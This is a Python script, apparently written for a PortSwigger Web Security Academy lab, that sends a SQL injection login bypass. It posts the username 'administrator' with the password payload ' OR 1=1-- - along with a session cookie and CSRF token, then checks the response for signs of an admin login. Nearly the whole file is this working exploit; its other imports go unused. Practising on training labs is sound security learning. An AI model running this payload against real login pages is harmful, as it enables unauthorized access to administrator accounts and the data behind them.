# For sending HTTP requests
import requests

# For Base64 encoding/decoding
from base64 import b64encode, b64decode, urlsafe_b64encode, urlsafe_b64decode

# For getting current time or for calculating time delays
from time import time

# For regular expressions
import re

# For running shell commands
import subprocess

# For multithreading
from concurrent.futures import ThreadPoolExecutor

# For running a HTTP server in the background
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# For parsing HTTP cookies
from http import cookies

# For getting command-line arguments
import sys

BASE_URL = "https://0a7e00b2032fa03dd7c8e88b00830084.web-security-academy.net"
session = requests.Session()

def login():
    url = BASE_URL + "/login"
    
    # Set the session cookie if needed
    session.cookies.set("session", "O13vju7WKNJ8YqvtPjUuROfTrBVeNuWB")  

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
        "Referer": url,
        "Origin": BASE_URL,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    # payload (un-URL-encoded)
    data = {
        "csrf": "wuOCZDodZJ5KF3mZcZEpoBqNBVXNd9W5",
        "username": "administrator",
        "password": "' OR 1=1-- -"
    }

    r = session.post(url, data=data, headers=headers, allow_redirects=True)
    print("status:", r.status_code)

     # quick check for a successful admin login (adjust based on actual page content)
    if "Log out" in r.text or "administrator" in r.text:
        print("Likely logged in as administrator")
    else:
        print("Login failed or response did not indicate success")



def main():
    # Allow BASE_URL to be modified
    ## global BASE_URL
    ## BASE_URL = sys.argv[1]
    
    # Call the login function
    login()


if __name__ == "__main__":
    main()